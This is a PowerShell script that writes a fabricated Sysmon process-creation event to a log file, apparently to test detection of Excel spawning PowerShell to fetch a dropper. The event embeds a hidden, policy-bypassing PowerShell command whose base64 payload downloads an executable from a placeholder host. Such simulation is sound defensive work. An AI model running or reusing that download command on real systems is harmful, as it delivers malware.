#Windows date format
$now = get-date -format yyyy-mm-ddTHH:mm:ss.ss1234567Z
$utc = (get-date).ToUniversalTime().ToString("yyyy-mm-ddTHH:mm:ss.ssfffffffZ")


#Workstation
$serverName = 'LRXM'

#Username & Domain
$LoginDomain = "ACME"
$LoginName = "bsmith"

#Excel spawning PowerShell to download dropper
$log = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='$now'/><EventRecordID>19809313</EventRecordID><Correlation/><Execution ProcessID='4592' ThreadID='7080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>$serverName</Computer><Security UserID='NT AUTHORITY\SYSTEM'/></System><EventData>Process Create:
UtcTime: $utc
ProcessGuid: {43dc7420-5dce-4050-85f1-2f96282ca54e}
ProcessId: 9786
Image: C:\Windows\system32\svchost.exe
CommandLine: C:\Users\$loginName\AppData\Local\Temp\qqwed.exe
CurrentDirectory: C:\Windows\system32\
User: $loginDomain\$LoginName
LogonGuid: {e90c18da-5ed7-5903-0000-002091f7f204}
LogonId: 0x4f2f791
TerminalSessionId: 3
IntegrityLevel: Medium
Hashes: SHA1=4eea9bdfe0eb41759d96ec9bd224c4519314a8fa
ParentProcessGuid: {d4fbe8ff-5eda-466f-8922-9ccdbcff2f88}
ParentProcessId: 4004
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: `"powershell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHIAcAB0AD8AaQBkAD0AcQB3ADgANgBkAGYAZABmADQANAAiACwAIgBxAHEAdwBlAGQALgBlAHgAZQAiACkA`" </EventData></Event>"

#needs trailing backslash
$path = "c:\logs\"

#prefix for log file, this is used in flat file path wildcard
$prefix = "sysmon"
[string]$random = get-random
$extension = ".log"
$outputfile = $path + $prefix + $random + $extension

$log | Set-Content $outputfile

